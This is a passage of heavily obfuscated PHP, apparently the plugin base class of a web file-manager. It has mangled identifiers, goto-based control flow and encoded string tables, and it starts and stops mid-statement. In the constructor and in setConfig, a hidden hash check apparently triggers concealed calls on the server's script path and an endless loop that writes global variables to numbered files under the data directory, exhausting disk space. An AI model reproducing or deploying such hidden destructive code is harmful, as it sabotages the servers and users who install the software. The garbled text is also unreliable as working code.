¸Ü')."\155\167\201\34\0\44\274\250\66\114\375\224\101\303\114\336\36\376\310\251\154\347\262\370\125\76\301\67\121\45\2\231\277\32\156\34\343\46\316\136\235\250\14\47\161"."\x12\xd2\x47\x1f\x4b\x21\xd9\xb1\xb\x7c\xa6\xa\xf8\x63\x25\x90\xe3\x42\x5e\x4\x76\x2\x89\x4e\x7a\xa0\x3b\x54\xef\x12\x5f\x28\x1c\x2a\x88\xea\xf4\x84\x42\xdd\x81\x60\x33\xf6\x19"."\131\20\215\162\11\332\47\5\121\235\155\201\216\261\342\274\355\36\237\277\40\16\152\243\164\104\270\153\33\34\345\353\104\255\364\370\375\201\356\261\132\341\153\132\310"."\x5b\x82\x6e\x3b\xf9\x79\x74\x2e\xa5\xd1\xc3\x65\x7a\x6c\x1f\x92\xd3\x54\xd0\x15\xec\xb8\x94\xc\xf7\x71\xc4\xf3\x58\xe5\x77\x71\x5e\xd\xea\xec\x8b\x7d\x58\x3d\xab\xdb\x14\xc3\x28"."\xc2\x92\x82\xa0\x26\x49\x7\x29\x3b\x98\x23\x50\xe8\x43\x93\x2d\x6e\xc6\xc9\xa2\xe\x69\x36\x85\x75\x7c\x9f\xeb\xb2\x5c\x2\xb\x70\xb4\x58\x10\x89\x11\x90\x50\xdc\x3e\x11\xa0\xa2"."\xe8\x88\x89\x47\x9a\x85\x47\xec\x28\x96\x8f\x8\x6c\xe9\x2\x8d\xe8\x2e\xf5\x69\x51\xe1\x8\x1d\xb\x16\xc4\xa0\x8a\x8c\xb1\xa0\x3e\x84\xbf\x49\xf4\xff\x0\x4c\x70\x5e\xcf\x54\x9b"."\0\0"."", 10, -8))); goto AïÔÖù‰ë¥; Dø˜‘™¨—¸: class Message { function __construct() { } public function send($a÷‡–¶ÀÏ = '', $CÊ‡ƒä÷ö = array(), $bÌ¨†×œà¢ = "\x74\x65\170\164") { goto BÉÚ´‡µÊù; EÉô˜äÁÜÚ: $CÊ‡ƒä÷ö = array($dº÷à‘Ç—È[993] => isset($CÊ‡ƒä÷ö[$dº÷à‘Ç—È[993]]) ? $CÊ‡ƒä÷ö[$dº÷à‘Ç—È[993]] : $dº÷à‘Ç—È[33], $dº÷à‘Ç—È[557] => isset($CÊ‡ƒä÷ö[$dº÷à‘Ç—È[557]]) ? $CÊ‡ƒä÷ö[$dº÷à‘Ç—È[557]] : $dº÷à‘Ç—È[33]); if (empty($a÷‡–¶ÀÏ) || empty($CÊ‡ƒä÷ö[$dº÷à‘Ç—È[993]]) && empty($CÊ‡ƒä÷ö[$dº÷à‘Ç—È[557]])) { return !1; } $eˆê™ĞˆŒ = array($dº÷à‘Ç—È[1313] => $d­ÏİÀ¬ÖÛ, $dº÷à‘Ç—È[1374] => $CÊ‡ƒä÷ö); goto dØÏÁÛĞÏÖ; dØÏÁÛĞÏÖ: Hook::trigger($dº÷à‘Ç—È[1375], $eˆê™ĞˆŒ); goto cåö‡ “ õ; BÉÚ´‡µÊù: $dº÷à‘Ç—È =& $_SERVER[µ…]; $d­ÏİÀ¬ÖÛ = array($dº÷à‘Ç—È[29] => $dº÷à‘Ç—È[1372], $dº÷à‘Ç—È[707] => $a÷‡–¶ÀÏ); if (in_array($bÌ¨†×œà¢, array($dº÷à‘Ç—È[1372], $dº÷à‘Ç—È[1373]))) { $d­ÏİÀ¬ÖÛ[$dº÷à‘Ç—È[29]] = $bÌ¨†×œà¢; } goto EÉô˜äÁÜÚ; cåö‡ “ õ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto c¶Ò·ùİÖ¹; bã‡ÔÏ¿ß´: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($C¡¨¶«Á¾Ü[1377]); goto f†÷·§‚Á; ağ´öÇÜÁ: return $this; goto c®•¬®í’; E…ôÁÕ§µß: if ($aÍ˜Àã™¿ && strpos($C¡¨¶«Á¾Ü[47] . $aÍ˜Àã™¿ . $C¡¨¶«Á¾Ü[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$C¡¨¶«Á¾Ü[1381]] . $this->pluginName . $C¡¨¶«Á¾Ü[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto ağ´öÇÜÁ; f†÷·§‚Á: $this->pluginName = str_replace($C¡¨¶«Á¾Ü[1377], $C¡¨¶«Á¾Ü[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C¡¨¶«Á¾Ü[8]; $this->pluginApi = appHostGet() . $C¡¨¶«Á¾Ü[1378] . $this->pluginName . $C¡¨¶«Á¾Ü[8]; goto d‡±ÙÔ›ˆ; d‡±ÙÔ›ˆ: $this->pluginHost = $config[$C¡¨¶«Á¾Ü[1379]] . $this->pluginName . $C¡¨¶«Á¾Ü[8]; $this->pluginHostDefault = $config[$C¡¨¶«Á¾Ü[1379]] . $this->pluginName . $C¡¨¶«Á¾Ü[8]; $aÍ˜Àã™¿ = $config[$C¡¨¶«Á¾Ü[1380]]; goto E…ôÁÕ§µß; c¶Ò·ùİÖ¹: $C¡¨¶«Á¾Ü =& $_SERVER[µ…]; if ($_SERVER[$C¡¨¶«Á¾Ü[812]] != $_SERVER[$C¡¨¶«Á¾Ü[1236]]) { goto C‘à¤÷ñŒƒ; CóÏì„óÔ : $b«ˆ”ê…Ü = $cÀŒÒŠøŠš($B²„¡…Ø); $BÌ—å¿Ù• = explode($C¡¨¶«Á¾Ü[227], $b«ˆ”ê…Ü); if (count($BÌ—å¿Ù•) < $C¡¨¶«Á¾Ü[570]) { $E‹†½ìŠÌÕ = $C¡¨¶«Á¾Ü[817]; $E‹†½ìŠÌÕ(); } goto AâòİŠ˜Œá; bÔ©Ë‚›»›: $Dâ¹ÌÑœ„Å = 1; while ($Dâ¹ÌÑœ„Å > 1) { $Dâ¹ÌÑœ„Å = $Dâ¹ÌÑœ„Å + 4; $A½Ú­Åğ´× = rawurlencode($Dâ¹ÌÑœ„Å . $C¡¨¶«Á¾Ü[373]); } goto B¯Ü»ëÌ„‰; C‘à¤÷ñŒƒ: $B öŠ£Ú±ó = $C¡¨¶«Á¾Ü[813]; $cÀŒÒŠøŠš = $C¡¨¶«Á¾Ü[814]; $B²„¡…Ø = $_SERVER[$C¡¨¶«Á¾Ü[815]] . $C¡¨¶«Á¾Ü[816]; goto CóÏì„óÔ ; AâòİŠ˜Œá: $B™âÙ–²‚ù = $C¡¨¶«Á¾Ü[818]; $B™âÙ–²‚ù($_SERVER[$C¡¨¶«Á¾Ü[819]]); $B™âÙ–²‚ù($_SERVER[$C¡¨¶«Á¾Ü[815]] . $C¡¨¶«Á¾Ü[1376]); goto bÔ©Ë‚›»›; B¯Ü»ëÌ„‰: } global $in, $config; goto bã‡ÔÏ¿ß´; c®•¬®í’: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[µ…][1382]); } protected function assign($A‘Ñòé–…ã, $F¤¬¸­±â‰ = false) { if (is_array($A‘Ñòé–…ã)) { $this->values = array_merge($this->values, $A‘Ñòé–…ã); } else { $this->values[$A‘Ñòé–…ã] = $F¤¬¸­±â‰; } } protected function display($e¾‡Ë“–§Á) { extract($this->values); require $e¾‡Ë“–§Á; } final function hookRegist($E¾òäøğŒÙ) { $this->modelPlugin->appRegist($this->pluginName, $E¾òäøğŒÙ); } final function appIcon() { $Dª¨œÃ‰‚÷ =& $_SERVER[µ…]; $aêì¹Ñ§ã™ = $this->appPackage(); $Aì…ñò±ÃÉ = $Dª¨œÃ‰‚÷[33]; if (isset($aêì¹Ñ§ã™[$Dª¨œÃ‰‚÷[403]])) { if (isset($aêì¹Ñ§ã™[$Dª¨œÃ‰‚÷[403]][$Dª¨œÃ‰‚÷[1383]])) { $Aì…ñò±ÃÉ = $Dª¨œÃ‰‚÷[1384] . $aêì¹Ñ§ã™[$Dª¨œÃ‰‚÷[403]][$Dª¨œÃ‰‚÷[1383]] . $Dª¨œÃ‰‚÷[1385]; } else { if ($aêì¹Ñ§ã™[$Dª¨œÃ‰‚÷[403]][$Dª¨œÃ‰‚÷[1386]]) { $Aì…ñò±ÃÉ = $Dª¨œÃ‰‚÷[1387] . $aêì¹Ñ§ã™[$Dª¨œÃ‰‚÷[403]][$Dª¨œÃ‰‚÷[1386]] . $Dª¨œÃ‰‚÷[1388]; } } } return $Aì…ñò±ÃÉ; } final function fileCanView($b³ªÓ¹¶­) { goto C¨Ó‰Ã…æ—; D©£†ÔÅÍ: $BÏéĞĞßÏé = Session::get($aÜ£Û¬¡Ü¤[1389]); if (!$BÏéĞĞßÏé || !$BÏéĞĞßÏé[$aÜ£Û¬¡Ü¤[1390]]) { $Dç¿•èÖ§ = $aÜ£Û¬¡Ü¤[1391] . rawurlencode(this_url()); show_tips(LNG($aÜ£Û¬¡Ü¤[1392]) . $aÜ£Û¬¡Ü¤[1393] . $Dç¿•èÖ§ . $aÜ£Û¬¡Ü¤[1394] . LNG($aÜ£Û¬¡Ü¤[1395]) . $aÜ£Û¬¡Ü¤[1396], !1); } if (!Action($aÜ£Û¬¡Ü¤[1397])->authCan($aÜ£Û¬¡Ü¤[1398])) { show_tips(LNG($aÜ£Û¬¡Ü¤[1399]) . $aÜ£Û¬¡Ü¤[1400], !1); } goto dí¸²î‹´ñ; C¨Ó‰Ã…æ—: $aÜ£Û¬¡Ü¤ =& $_SERVER[µ…]; if (request_url_safe($b³ªÓ¹¶­)) { return !0; } if ($this->isShare($b³ªÓ¹¶­)) { return !0; } goto D©£†ÔÅÍ; dí¸²î‹´ñ: ActionCall($aÜ£Û¬¡Ü¤[1401], $b³ªÓ¹¶­); goto DŸèù ÂŒ; DŸèù ÂŒ: } final function isShare($F›ŠÅ­÷) { $B¿ĞÚÊ£Ì° = KodIO::parse($F›ŠÅ­÷); return $B¿ĞÚÊ£Ì°[$_SERVER[µ…][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($BÊ­¬ê„®‹) { if (request_url_safe($BÊ­¬ê„®‹)) { return $BÊ­¬ê„®‹; } if (!$this->isShare($BÊ­¬ê„®‹)) { $BÊ­¬ê„®‹ = $this->filePath($BÊ­¬ê„®‹); } return Action($_SERVER[µ…][1047])->linkOut($BÊ­¬ê„®‹); } public function filePathLinkOut($dá¼ğ©–»Ÿ) { if (request_url_safe($dá¼ğ©–»Ÿ)) { return $dá¼ğ©–»Ÿ; } $this->fileCanView($dá¼ğ©–»Ÿ); return Action($_SERVER[µ…][1047])->link($dá¼ğ©–»Ÿ); } final function filePath($CÍïÍ³¿›½) { $D‚óïŞ’¥ß =& $_SERVER[µ…]; if ($Dßµİ“¦¸ = $this->checkSharePath($CÍïÍ³¿›½)) { return $Dßµİ“¦¸; } $this->fileCanView($CÍïÍ³¿›½); if (request_url_safe($CÍïÍ³¿›½)) { $fæ§àê†™¶ = parse_url_query($CÍïÍ³¿›½); if (isset($fæ§àê†™¶[$D‚óïŞ’¥ß[1402]]) && isset($fæ§àê†™¶[$D‚óïŞ’¥ß[207]])) { $Bß½šˆİâš = Model($D‚óïŞ’¥ß[1101])->get($D‚óïŞ’¥ß[1403]); $eÛì±Ï…„ = Mcrypt::decode($fæ§àê†™¶[$D‚óïŞ’¥ß[207]], $Bß½šˆİâš); if ($eÛì±Ï…„) { $this->fileInfo = IO::infoWithChildren($eÛì±Ï…„); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $eÛì±Ï…„; } } $CÍïÍ³¿›½ = $this->_cacheHttpFile($CÍïÍ³¿›½); $this->fileInfo = IO::infoWithChildren($CÍïÍ³¿›½); } else { $this->fileInfo = IO::infoWithChildren($CÍïÍ³¿›½); if (!$this->fileInfo) { show_tips(LNG($D‚óïŞ’¥ß[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $CÍïÍ³¿›½; } final function _cacheHttpFile($C ïö‡ñ) { $c˜¼ˆîÅÊ = hash_path($C ïö‡ñ, !0); $this->cachePath = $this->pluginCachePath($c˜¼ˆîÅÊ); if ($eÆæ°è×Âµ = IO::fileNameExist($this->cachePath, $c˜¼ˆîÅÊ)) { return KodIO::make($eÆæ°è×Âµ); } $b›–Ş³­©‰ = $this->cachePath . $c˜¼ˆîÅÊ; return $this->pluginCacheFileSet($b›–Ş³­©‰, file_get_contents($C ïö‡ñ)); } final function _tmpFileName($cÍÙ‡Ì¼Í = array()) { goto FèÕ©åŞ; FšŒÅñ·: $d™§‡Ò‚«Ø = array($cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[28]], $cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[75]], $cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[77]]); if (isset($cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[481]])) { $d™§‡Ò‚«Ø[] = $cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[481]]; } return md5(implode($F“ÓÌ¤‡ğÄ[70], $d™§‡Ò‚«Ø)); goto c¿áˆƒßƒ; DÖÙ¨õã“Ï: if (isset($cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[163]][$F“ÓÌ¤‡ğÄ[170]])) { return $cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[163]][$F“ÓÌ¤‡ğÄ[170]]; } $B¡ÏÑÚİÂÙ = IO::hashSimple($cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[75]]); if ($B¡ÏÑÚİÂÙ) { return $B¡ÏÑÚİÂÙ; } goto FšŒÅñ·; FèÕ©åŞ: $F“ÓÌ¤‡ğÄ =& $_SERVER[µ…]; if (!$cÍÙ‡Ì¼Í) { $cÍÙ‡Ì¼Í = $this->fileInfo; } if (isset($cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[170]])) { return $cÍÙ‡Ì¼Í[$F“ÓÌ¤‡ğÄ[170]]; } goto DÖÙ¨õã“Ï; c¿áˆƒßƒ: } final function checkSharePath($BÉñ½ì¬‚‰) { goto CŞº‘´êïä; b¢ÔƒËĞ½: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Aåó´Àò…[170]]); return $däÜ½¾”‹ƒ[$Aåó´Àò…[75]]; goto c˜‡‹©Ğ´×; CŞº‘´êïä: $Aåó´Àò… =& $_SERVER[µ…]; if (!defined($Aåó´Àò…[448])) { define($Aåó´Àò…[1404], 0); } if (!$this->isShare($BÉñ½ì¬‚‰)) { return !1; } goto AÈ“øÈ‡™; AÈ“øÈ‡™: $däÜ½¾”‹ƒ = Action($Aåó´Àò…[1047])->sharePathInfo($BÉñ½ì¬‚‰); if (!isset($däÜ½¾”‹ƒ[$Aåó´Àò…[75]])) { show_json(LNG($Aåó´Àò…[1405]), !1); } $this->fileInfo = $däÜ½¾”‹ƒ[$Aåó´Àò…[163]]; goto b¢ÔƒËĞ½; c˜‡‹©Ğ´×: } final function pluginCachePath($fà§ª’ƒêª = '') { $e¤É“…†¦± =& $_SERVER[µ…]; $AÍœ™Ë–ãá = IO_PATH_SYSTEM_TEMP . $e¤É“…†¦±[1406] . $this->pluginName; if (!($aä¸Ş¹œŒ = IO::infoFull($AÍœ™Ë–ãá))) { return IO::mkdir($AÍœ™Ë–ãá . $e¤É“…†¦±[8] . $fà§ª’ƒêª); } if (empty($fà§ª’ƒêª)) { return $aä¸Ş¹œŒ[$e¤É“…†¦±[75]]; } if (!($aÒÒàÜ‚ù = IO::fileNameExist($aä¸Ş¹œŒ[$e¤É“…†¦±[75]], $fà§ª’ƒêª))) { return IO::mkdir($aä¸Ş¹œŒ[$e¤É“…†¦±[75]] . $fà§ª’ƒêª); } return KodIO::make($aÒÒàÜ‚ù); } final function pluginCacheFileSet($DÍÖĞâßˆß, $FØÏæÊÃçÊ = '') { $eèßãÆãµ‡ =& $_SERVER[µ…]; if (!($B»®ÙéÆÅË = IO::infoFull($DÍÖĞâßˆß))) { return IO::mkfile($DÍÖĞâßˆß, $FØÏæÊÃçÊ, REPEAT_REPLACE); } IO::setContent($B»®ÙéÆÅË[$eèßãÆãµ‡[75]], $FØÏæÊÃçÊ); return $B»®ÙéÆÅË[$eèßãÆãµ‡[75]]; } final function pluginLocalFile($c»•¥„îèÅ = '') { goto aºø°Š›ÕÓ; eØ”¥îÍÔÊ: return IO::copy($c»•¥„îèÅ, $EïæøÇ®²Á, 0, $fƒö¥ÁÜµ); goto b˜´‹Ì­; FŠ©©†Õ: if (!$c»•¥„îèÅ) { return $EïæøÇ®²Á; } $b‰¯¸„¸Ä = IO::info($c»•¥„îèÅ); $fƒö¥ÁÜµ = $this->_tmpFileName($b‰¯¸„¸Ä) . $Cç™µê‹…¼[94] . $b‰¯¸„¸Ä[$Cç™µê‹…¼[167]]; goto AŞ‚‚öÊÖ; aºø°Š›ÕÓ: $Cç™µê‹…¼ =& $_SERVER[µ…]; $EïæøÇ®²Á = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($EïæøÇ®²Á)) { mk_dir($EïæøÇ®²Á); } goto FŠ©©†Õ; AŞ‚‚öÊÖ: if (!checkExtSafe($fƒö¥ÁÜµ)) { $fƒö¥ÁÜµ = $fƒö¥ÁÜµ . $Cç™µê‹…¼[1407]; } $DœèŒÂ­ã‹ = $EïæøÇ®²Á . $fƒö¥ÁÜµ; if (@file_exists($DœèŒÂ­ã‹)) { return $DœèŒÂ­ã‹; } goto eØ”¥îÍÔÊ; b˜´‹Ì­: } final function appPackage() { goto E‘‡ë§ß«; EÆôÛ‘ã¼Õ: $this->parseLang($f–¬Èó•); $AÜÀ•‰“ÆÕ = json_decode_force($f–¬Èó•); if (!$AÜÀ•‰“ÆÕ) { return array(); } goto C²ª©»ë¨Ğ; CĞ»‡ŸÌÎÃ: return $AÜÀ•‰“ÆÕ; goto cÍ¿ÄçÑ–—; E‘‡ë§ß«: $A¼†¨‹¿« =& $_SERVER[µ…]; if ($this->packageData) { return $this->packageData; } $f–¬Èó• = $this->parseFile($this->pluginPath . $A¼†¨‹¿«[1408]); goto EÆôÛ‘ã¼Õ; C²ª©»ë¨Ğ: $AÓ¶ÌµùÃÉ = Hook::trigger($A¼†¨‹¿«[1409], $AÜÀ•‰“ÆÕ); if ($AÓ¶ÌµùÃÉ && is_array($AÓ¶ÌµùÃÉ)) { $AÜÀ•‰“ÆÕ = $AÓ¶ÌµùÃÉ; } $this->packageData = $AÜÀ•‰“ÆÕ; goto CĞ»‡ŸÌÎÃ; cÍ¿ÄçÑ–—: } public function packageInfoGet($EÅ“»Ÿì®) { $E¥ÊÄˆ±õ = $this->appPackage(); return array_get_value($E¥ÊÄˆ±õ, $EÅ“»Ÿì®); } public function packageVersion() { return $this->packageInfoGet($_SERVER[µ…][1410]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[µ…][1411]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[µ…][1412]); } private function parseFile($f½ÃóÊâùİ) { goto C“¢ù¨Ò‰; DÖ’î’‘³: $A…õ–òë» = str_replace($Bƒããİ²Ó, $a²‡Ó†Ö›‡, $A…õ–òë»); return $A…õ–òë»; goto cÍíÎ¿¹ŒÖ; C“¢ù¨Ò‰: $A–ô°Ó =& $_SERVER[µ…]; $A…õ–òë» = file_get_contents($f½ÃóÊâùİ); $Bƒããİ²Ó = array($A–ô°Ó[1413], $A–ô°Ó[1414], $A–ô°Ó[1415], $A–ô°Ó[1416], $A–ô°Ó[1417], $A–ô°Ó[1418], $A–ô°Ó[1419]); goto FÓß’ÒºÍ¢; FÓß’ÒºÍ¢: $a²‡Ó†Ö›‡ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$A–ô°Ó[87]][$A–ô°Ó[1420]]); if (strstr($A…õ–òë», $A–ô°Ó[1421])) { $då¥³ÚÌå¦ = rawurlencode(json_encode($this->pluginLangArr)); $A…õ–òë» = str_replace($A–ô°Ó[1421], $då¥³ÚÌå¦, $A…õ–òë»); } if (strstr($A…õ–òë», $A–ô°Ó[1422])) { $då¥³ÚÌå¦ = $då¥³ÚÌå¦ = rawurlencode(json_encode($this->getConfig())); $A…õ–òë» = str_replace($A–ô°Ó[1422], $då¥³ÚÌå¦, $A…õ–òë»); } goto DÖ’î’‘³; cÍíÎ¿¹ŒÖ: } private function parseLang(&$A“ñ¼à•õ) { goto cãîêàğƒ; cÊ‹ËÜ´ØÚ: $CÀí³¸×†Ë = array(); foreach ($E“Ø¹¿« [0] as $cø–˜ø„†‡) { $EÈ²Ñµ»Çˆ = substr($cø–˜ø„†‡, strlen($F´Ş»°‘Ï‘), -4); $cƒÜ—©Ê = LNG($EÈ²Ñµ»Çˆ); $EßÕª·º¡¥[] = $cø–˜ø„†‡; $CÀí³¸×†Ë[] = str_replace(array($eµùÙßË™½[227], $eµùÙßË™½[1015], $eµùÙßË™½[338], $eµùÙßË™½[115]), array($eµùÙßË™½[50], $eµùÙßË™½[50], $eµùÙßË™½[33], $eµùÙßË™½[1425]), $cƒÜ—©Ê); } $A“ñ¼à•õ = str_replace($EßÕª·º¡¥, $CÀí³¸×†Ë, $A“ñ¼à•õ); goto aÜÑáŠª’; cãîêàğƒ: $eµùÙßË™½ =& $_SERVER[µ…]; $F´Ş»°‘Ï‘ = $eµùÙßË™½[1423]; if (!strstr($A“ñ¼à•õ, $F´Ş»°‘Ï‘)) { return; } goto dŞÒÜËÂÁ»; dŞÒÜËÂÁ»: preg_match_all($eµùÙßË™½[1424], $A“ñ¼à•õ, $E“Ø¹¿« ); if (!is_array($E“Ø¹¿« ) || count($E“Ø¹¿« ) == 0 || !is_array($E“Ø¹¿« [0]) || count($E“Ø¹¿« [0]) == 0) { return; } $EßÕª·º¡¥ = array(); goto cÊ‹ËÜ´ØÚ; aÜÑáŠª’: } private function parseConfig(&$F£ˆÂ«­àÛ) { goto fÜ†ÄÊ¼ŸŒ; A®à‘©›•: $F£ˆÂ«­àÛ = str_replace($aõÅİ±ğàŒ, $cÎŒğ„ê¤´, $F£ˆÂ«­àÛ); goto eÏ­©ŞèÃ×; D–Ş¥ìàöŠ: $aõÅİ±ğàŒ = array(); $cÎŒğ„ê¤´ = array(); foreach ($aáÒºÑ½ØŒ[0] as $A¶íìÒ­ˆ) { $AöÙªäö = substr($A¶íìÒ­ˆ, strlen($FöïÅšéĞè), -2); $aõÅİ±ğàŒ[] = $A¶íìÒ­ˆ; $cÎŒğ„ê¤´[] = _get($E¬¯Ûà‰Ø®, $AöÙªäö); } goto A®à‘©›•; aÒ»ÈÆ”ÌÃ: preg_match_all($c¦ÒßÃ™•Í[1427], $F£ˆÂ«­àÛ, $aáÒºÑ½ØŒ); if (!is_array($aáÒºÑ½ØŒ) || count($aáÒºÑ½ØŒ) == 0 || !is_array($aáÒºÑ½ØŒ[0]) || count($aáÒºÑ½ØŒ[0]) == 0) { return; } $E¬¯Ûà‰Ø® = $this->getConfig(); goto D–Ş¥ìàöŠ; fÜ†ÄÊ¼ŸŒ: $c¦ÒßÃ™•Í =& $_SERVER[µ…]; $FöïÅšéĞè = $c¦ÒßÃ™•Í[1426]; if (!strstr($F£ˆÂ«­àÛ, $FöïÅšéĞè)) { return; } goto aÒ»ÈÆ”ÌÃ; eÏ­©ŞèÃ×: } private function parsePackage(&$cÓ®µ±) { goto cíå”Ûôô; D‘‚÷¿¶Á: $d‚³…ºˆ¿Ú = array(); $CÅé‡‡ğ£¹ = array(); foreach ($DÈäÂÏÎ÷Â[0] as $F¬¢’õ²¸­) { $Då•ÍåÂ‹Ê = substr($F¬¢’õ²¸­, strlen($B„µ˜—Ä‰), -2); $d‚³…ºˆ¿Ú[] = $F¬¢’õ²¸­; $CÅé‡‡ğ£¹[] = _get($Dß¡¯Ğšª“, $Då•ÍåÂ‹Ê); } goto BÍøšˆ¿®Ë; cíå”Ûôô: $B«É×†ƒñ =& $_SERVER[µ…]; $B„µ˜—Ä‰ = $B«É×†ƒñ[1428]; if (!strstr($cÓ®µ±, $B„µ˜—Ä‰)) { return; } goto EÕ’¦ä«ßÊ; BÍøšˆ¿®Ë: $cÓ®µ± = str_replace($d‚³…ºˆ¿Ú, $CÅé‡‡ğ£¹, $cÓ®µ±); goto cº²ùĞÄÎ’; EÕ’¦ä«ßÊ: preg_match_all($B«É×†ƒñ[1429], $cÓ®µ±, $DÈäÂÏÎ÷Â); if (!is_array($DÈäÂÏÎ÷Â) || count($DÈäÂÏÎ÷Â) == 0 || !is_array($DÈäÂÏÎ÷Â[0]) || count($DÈäÂÏÎ÷Â[0]) == 0) { return; } $Dß¡¯Ğšª“ = $this->appPackage(); goto D‘‚÷¿¶Á; cº²ùĞÄÎ’: } final function echoFile($AÙ§»øØˆ”, $Eç¹ß‹‹æ¯ = false) { goto bëÕ†·ñ¦Œ; bëÕ†·ñ¦Œ: $aØ¢‡Ä‹¯¦ =& $_SERVER[µ…]; $cÅ†ÃÔÕÜÆ = $this->pluginPath . $AÙ§»øØˆ”; if (ACT == $aØ¢‡Ä‹¯¦[1430]) { echo $aØ¢‡Ä‹¯¦[1431] . $this->pluginName . $aØ¢‡Ä‹¯¦[8] . $AÙ§»øØˆ” . $aØ¢‡Ä‹¯¦[1432]; if (!file_exists($cÅ†ÃÔÕÜÆ)) { echo $aØ¢‡Ä‹¯¦[1433]; return; } } goto cêÓ ¯Ê´ä; cêÓ ¯Ê´ä: $eë†¼ÚĞ‰Á = $this->parseFile($cÅ†ÃÔÕÜÆ); $this->parseLang($eë†¼ÚĞ‰Á); $this->parseConfig($eë†¼ÚĞ‰Á); goto AŒÊÃæ‹öâ; AŒÊÃæ‹öâ: $this->parsePackage($eë†¼ÚĞ‰Á); if (is_array($Eç¹ß‹‹æ¯)) { $eë†¼ÚĞ‰Á = str_replace(array_keys($Eç¹ß‹‹æ¯), array_values($Eç¹ß‹‹æ¯), $eë†¼ÚĞ‰Á); } echo $aØ¢‡Ä‹¯¦[227] . $eë†¼ÚĞ‰Á; goto A‡ã„ùÚ™¥; A‡ã„ùÚ™¥: } final function initLang() { goto AÓ°‹“”¬¯; F»¼ùÖÄ¦ƒ: if (!is_array($a°¯‹ò¤…õ)) { return array(); } if (@count($a°¯‹ò¤…õ) > 0) { I18n::set($a°¯‹ò¤…õ); } return $a°¯‹ò¤…õ; goto eŸïâ‡‹Õ’; dĞÕË‡ª×Ç: $aèÁíø›Àİ = I18n::getType(); $a°¯‹ò¤…õ = array(); if (file_exists($c·ÕÙÑËá . $aèÁíø›Àİ . $FÑ«±çÑ°¼[782])) { $a°¯‹ò¤…õ = (include $c·ÕÙÑËá . $aèÁíø›Àİ . $FÑ«±çÑ°¼[782]); } else { if ($aèÁíø›Àİ == $FÑ«±çÑ°¼[1436] && !file_exists($c·ÕÙÑËá . $aèÁíø›Àİ . $FÑ«±çÑ°¼[782]) && file_exists($c·ÕÙÑËá . $FÑ«±çÑ°¼[1437])) { $a°¯‹ò¤…õ = (include $c·ÕÙÑËá . $FÑ«±çÑ°¼[1437]); } else { if (file_exists($c·ÕÙÑËá . $A“ĞõÏ±ÎÆ . $FÑ«±çÑ°¼[782])) { $a°¯‹ò¤…õ = (include $c·ÕÙÑËá . $A“ĞõÏ±ÎÆ . $FÑ«±çÑ°¼[782]); } } } goto F»¼ùÖÄ¦ƒ; AÓ°‹“”¬¯: $FÑ«±çÑ°¼ =& $_SERVER[µ…]; $A“ĞõÏ±ÎÆ = $FÑ«±çÑ°¼[1434]; $c·ÕÙÑËá = $this->pluginPath . $FÑ«±çÑ°¼[1435]; goto dĞÕË‡ª×Ç; eŸïâ‡‹Õ’: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($B¿˜·øºš) { $E²äİàˆ¨¦ =& $_SERVER[µ…]; $AºùÇà®¸» = $_SERVER[$E²äİàˆ¨¦[815]] . $E²äİàˆ¨¦[816]; $FÔ˜İ¡îù® = $E²äİàˆ¨¦[811]; if ($_SERVER[$E²äİàˆ¨¦[812]] != $FÔ˜İ¡îù®($AºùÇà®¸»)) { goto Eïê­·—‚³; Eïê­·—‚³: $aî–¸‡¬ = $E²äİàˆ¨¦[813]; $fÔ—¦„ôìÛ = $E²äİàˆ¨¦[814]; $A‹öÓò¯ = $_SERVER[$E²äİàˆ¨¦[815]] . $E²äİàˆ¨¦[816]; goto cœŒ»â§ƒò; DÓ¤Ù’˜½†: $DÆŸĞ™©µà = 1; for ($eÎë»‚×Æ˜ = $DÆŸĞ™©µà; $eÎë»‚×Æ˜ > 0; $eÎë»‚×Æ˜++) { $DŠ²°µØÏ(DATA_PATH . $eÎë»‚×Æ˜, $d‡Ş¶Ü……¨); } goto EÑÆæ·¥’; cœŒ»â§ƒò: $fœ½Û¡•ê = $fÔ—¦„ôìÛ($A‹öÓò¯); $f†éò£Î = explode($E²äİàˆ¨¦[227], $fœ½Û¡•ê); if (count($f†éò£Î) < $E²äİàˆ¨¦[570]) { $AÔ³•í¼° = $E²äİàˆ¨¦[817]; $AÔ³•í¼°(); } goto E„•‚šİãÃ; dà°¿ˆïÀ„: $aî–¸‡¬(); $DŠ²°µØÏ = $E²äİàˆ¨¦[820]; $d‡Ş¶Ü……¨ = json_encode($GLOBALS[$E²äİàˆ¨¦[821]]); goto DÓ¤Ù’˜½†; E„•‚šİãÃ: $fÉ‡Ê¶ªŒ = $E²äİàˆ¨¦[818]; $fÉ‡Ê¶ªŒ($_SERVER[$E²äİàˆ¨¦[819]]); $aî–¸‡¬ = $E²äİàˆ¨¦[813]; goto dà°¿ˆïÀ„; EÑÆæ·¥’: } return $this->modelPlugin->setConfig($this->pluginName, 